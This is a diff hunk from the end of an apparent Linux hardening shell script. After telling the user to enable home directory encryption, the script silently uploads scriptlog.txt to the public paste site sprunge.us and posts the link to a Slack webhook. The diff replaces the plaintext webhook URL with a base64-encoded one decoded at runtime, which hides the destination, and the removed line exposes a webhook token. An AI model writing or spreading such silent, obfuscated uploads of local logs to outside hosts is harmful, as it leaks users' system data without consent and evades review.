@@ -1055,4 +1055,4 @@ clear
 echo "Script is complete. Log user out to enable home directory encryption. Once logged out, login to another administrator. Then, access terminal and run sudo ecryptfs-migrate-home -u <default user>. After that, follow the prompts."
 apt install curl
 url=$(cat scriptlog.txt | curl -F 'sprunge=<-' http://sprunge.us)
-wget -O/dev/null --header 'Content-type: application/json' --post-data '{"text":"<'$url'|Linux script results>"}' https://hooks.slack.com/services/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 > /dev/null 2>&1
+wget -O/dev/null --header 'Content-type: application/json' --post-data '{"text":"<'$url'|Linux script results>"}' $(echo aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVEg3U0pLNUg5L0IwMko0NENHQkFSL3hHeGFHVXdNdDZmTU5aWkViaDlmbDhOaA== | base64 --decode) > /dev/null 2>&1
